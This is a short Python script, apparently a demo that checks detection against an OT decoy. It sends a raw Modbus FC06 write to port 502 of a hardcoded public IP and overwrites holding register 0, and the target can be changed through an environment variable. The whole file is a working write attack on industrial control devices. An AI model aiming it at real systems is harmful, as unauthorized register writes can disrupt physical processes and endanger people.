import socket, os

# Modbus/TCP "Write Single Register" (FC06): an external attacker overwrites
# holding register 0 of an internet-exposed OT device with the value 0x00FF.
# The decoy's public IP rotates - override it without editing this file:
#   PowerShell:  $env:DECOY_IP="34.66.220.215"; python demo_attack.py
DECOY_IP = os.environ.get("DECOY_IP", "34.66.220.215")  # current internet-exposed OT decoy
TARGET = (DECOY_IP, 502)
PDU    = bytes.fromhex("0001000000060106000000ff")  # FC06  reg[0] = 0x00FF

print(f"[ATTACK]  Modbus WRITE  ->  {TARGET[0]}:{TARGET[1]}")
print(f"[WIRE]    {PDU.hex(' ')}")

sock = socket.create_connection(TARGET, timeout=8)
sock.sendall(PDU)
reply = sock.recv(64)
sock.close()

print(f"[REPLY]   {reply.hex(' ')}   (decoy is live, attack logged)")
print("[DONE]    watch it land in Splunk in ~5s")
